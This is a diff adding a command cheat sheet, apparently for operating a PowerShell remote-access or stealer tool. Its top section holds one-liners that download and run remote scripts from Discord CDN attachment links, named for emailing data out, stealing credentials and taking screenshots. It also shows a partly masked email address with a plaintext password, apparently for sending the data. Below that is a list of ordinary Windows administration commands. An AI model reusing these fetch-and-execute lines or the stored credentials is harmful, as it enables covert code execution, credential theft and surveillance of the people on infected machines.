@@ -1,0 +1,46 @@
+                                    
+                                                                  ========== Commands ============
+-Email:
+Powershell $attachment = '{cmdxx}'
+     (Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/939931011838509090/946621682653745224/send.ps1").content | Invoke-Expression
+     
+     
+Usage: (-creds) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/951960825093058631/CRED.ps1'))
+				
+Usage: (-screenshot) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/946619974846382100/screenshot.ps1'))
+
+     
+[EMAIL]: su***boyli*******n@cloud.xxx.com
+[PASS] : Pzssw0rd1!
+
+
+		[MISC-COMMANDS] 
+======================================================
+Usage: Alias -- Commands       
+Usage: tasklist || > data.txt 
+Usage: taskill /F /PID pid_number ||  /IM "process name" /F || Stop-Process -ID 2137 -Force
+Usage: Cipher /E
+Usage: driverquery /FO list /v
+Usage: Attrib +h +s +r folder_name
+Usage: mkdir || echo data > data.txt
+Usage: wmic product get name
+Usage: SFC /Scannow
+======================================================
+Usage: call /?
+Usage: del /?
+Usage: echo /?
+Usage: for /?
+Usage: goto /?
+Usage: if /?
+Usage: pause /?
+Usage: rem /?
+Usage: set /?
+Usage: type /?
+======================================================
+Usage: (UNZIP) Expand-Archive -Force ./TEMP.zip ./TEMP ||  tar -xf TEMP.zip
+Usage: (TYPE) echo "content" > appx.txt || Get-Content ./appx.txt 
+			out-file -encoding UTF8 ./appx.py
+======================================================
+
+
+
